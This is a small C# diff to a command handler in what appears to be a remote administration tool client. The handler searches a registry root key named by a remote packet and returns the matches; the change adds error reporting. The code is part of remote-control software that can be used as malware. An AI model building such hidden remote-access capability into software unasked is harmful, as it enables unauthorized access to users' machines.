@@ -36,10 +36,15 @@ namespace xClient.Core.Commands
                     RegistrySeeker seeker = new RegistrySeeker();
                     seeker.BeginSeeking(packet.RootKeyName);
 
-                    responsePacket.RootKey = packet.RootKeyName;
                     responsePacket.Matches = seeker.Matches;
+                    responsePacket.IsError = false;
                 }
-                catch { }
+                catch (Exception e)
+                {
+                    responsePacket.IsError = true;
+                    responsePacket.ErrorMsg = e.Message;
+                }
+                responsePacket.RootKey = packet.RootKeyName;
                 responsePacket.Execute(client);
             }).Start();
         }
